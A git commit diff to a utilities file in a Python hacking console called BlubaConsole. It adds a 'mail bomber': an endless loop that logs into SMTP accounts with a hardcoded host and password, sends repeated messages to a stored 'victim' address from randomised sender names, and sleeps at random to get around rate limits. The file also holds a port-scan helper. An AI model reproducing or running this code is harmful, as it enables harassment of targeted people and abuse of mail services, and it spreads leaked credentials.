cdfd9f4ebcc8bb5954425547a701eb7b10d8de6c
ChujaNieMasz <87039622+CNM-GCANP@users.noreply.github.com>
2023-12-01 21:55:50 +0100

    Update utils.py

--- Tools/utils.py
+++ Tools/utils.py
@@ -9,6 +9,9 @@ import datetime
 import subprocess
 import os
 import time
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 def get_time_rn():
     date = datetime.datetime.now()
     hour = date.hour
@@ -33,6 +36,22 @@ pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
 dark_green = Fore.GREEN + Style.BRIGHT
 dark = Style.DIM
 normal = Style.NORMAL
+
+
+ct8smtphost = "s1.ct8.pl"
+ct8smtpport = 587
+ct8smtppass = "BlubaMailBomber23:6"
+
+def info():
+    print(f"""
+{reset}{dark}╔════[ {normal}{cyan}BlubaConsole{reset}{dark}]
+{reset}{dark}╠═{normal}{pink}Author: {pretty}gigachadaniepizda1
+{reset}{dark}╠═{normal}{pink}Github: {pretty}https://github.com/CNM-GCANP
+{reset}{dark}╠═{normal}{pink}Project Github: {pretty}https://github.com/CNM-GCANP/BlubaConsole
+{reset}{dark}╠═{normal}{pink}BIO: {pretty}https://guns.lol/nyga
+{reset}{dark}╚════[ {normal}{cyan}BlubaConsole {reset}{dark}]
+""")
+    
 def format_date(date):
     return date.strftime('%Y-%m-%d %H:%M:%S %Z') if date else "N/A"
 
@@ -115,6 +134,47 @@ def setJip(ip):
     data['IP'] = ip
     with open(cache, 'w') as file:
         json.dump(data, file, indent=4)
+
+
+def loadJbombersubject():
+    cache = 'Tools/cache.json'
+    with open(cache, 'r') as file:
+        data = json.load(file)
+    return data['BomberSubject']
+def setJbombersubject(subject):
+    cache = 'Tools/cache.json'
+    with open(cache, 'r') as file:
+        data = json.load(file)
+    data['BomberSubject'] = subject
+    with open(cache, 'w') as file:
+        json.dump(data, file, indent=4)
+
+def loadJbomberbody():
+    cache = 'Tools/cache.json'
+    with open(cache, 'r') as file:
+        data = json.load(file)
+    return data['BomberBody']
+def setJbomberbody(subject):
+    cache = 'Tools/cache.json'
+    with open(cache, 'r') as file:
+        data = json.load(file)
+    data['BomberBody'] = subject
+    with open(cache, 'w') as file:
+        json.dump(data, file, indent=4)
+
+def loadJbombervictim():
+    cache = 'Tools/cache.json'
+    with open(cache, 'r') as file:
+        data = json.load(file)
+    return data['BomberVictim']
+def setJbombervictim(subject):
+    cache = 'Tools/cache.json'
+    with open(cache, 'r') as file:
+        data = json.load(file)
+    data['BomberVictim'] = subject
+    with open(cache, 'w') as file:
+        json.dump(data, file, indent=4)
+        
 def scan_ip(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     socket.setdefaulttimeout(1)
@@ -124,12 +184,55 @@ def scan_ip(ip, port):
         print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{green}+{reset}{dark}) {normal}{pretty}IP Found: {cyan}{ip}")
     else:
         return 0
-def info():
-    print(f"""
-{reset}{dark}╔════[ {normal}{cyan}BlubaConsole{reset}{dark}]
-{reset}{dark}╠═{normal}{pink}Author: {pretty}gigachadaniepizda1
-{reset}{dark}╠═{normal}{pink}Github: {pretty}https://github.com/CNM-GCANP
-{reset}{dark}╠═{normal}{pink}Project Github: {pretty}https://github.com/CNM-GCANP/BlubaConsole
-{reset}{dark}╠═{normal}{pink}BIO: {pretty}https://guns.lol/nyga
-{reset}{dark}╚════[ {normal}{cyan}BlubaConsole {reset}{dark}]
-""")
+
+
+def getsmtp(smtp):
+    ct8smtpmails = [
+        "2456@mailbomberblub.ct8.pl",
+        "5678@mailbomberblub.ct8.pl",
+        "2345@mailbomberblub.ct8.pl",
+        "9843@mailbomberblub.ct8.pl",
+        "8365@mailbomberblub.ct8.pl",
+        "9475@mailbomberblub.ct8.pl",
+        "0164@mailbomberblub.ct8.pl",
+        "5713@mailbomberblub.ct8.pl",
+        "9465@mailbomberblub.ct8.pl"
+    ]
+    if int(smtp) == 1:
+        mail = random.choice(ct8smtpmails)
+        return mail
+def spammail(bombervictim, bombersubject, bomberbody):
+    try:
+        while True:
+            smtp = random.randint(1,1)
+            if smtp == 1:
+                host = "s1.ct8.pl"
+                smport = 587
+                password = "BlubaMailBomber23:6"
+                frommail = "BlubaBomberONTOP" + str(random.randint(1, 1000)) + "@mailbomberblub.ct8.pl"
+                mail = getsmtp(smtp)
+            message = MIMEMultipart()
+            message["From"] = frommail
+            message["To"] = bombervictim
+            message["Subject"] = bombersubject
+            message.attach(MIMEText(bomberbody, "plain"))
+            server = smtplib.SMTP(host, smport)
+            server.starttls()
+            server.login(mail, password)
+            try:
+                server.sendmail(frommail, bombervictim, message.as_string())
+                time_rn = get_time_rn()
+                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Message Sended {gray}| {green}{smtp}")
+            except Exception as e:
+                time_rn = get_time_rn()
+                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Error {gray}| {str(e)}")
+            except KeyboardInterrupt:
+                print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{red}-{reset}{dark}) {normal}{pretty}Interrupt")
+            finally:
+                server.quit()
+            t = random.randint(1,9)
+            time_rn = get_time_rn()
+            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pink}Waiting {t} seconds (Cooldown Bypass)")
+            time.sleep(t)
+    except KeyboardInterrupt:
+        print(f"{reset}{dark}[ {normal}{cyan}{time_rn}{reset}{dark} ] ({normal}{red}-{reset}{dark}) {normal}{pretty}Interrupt")
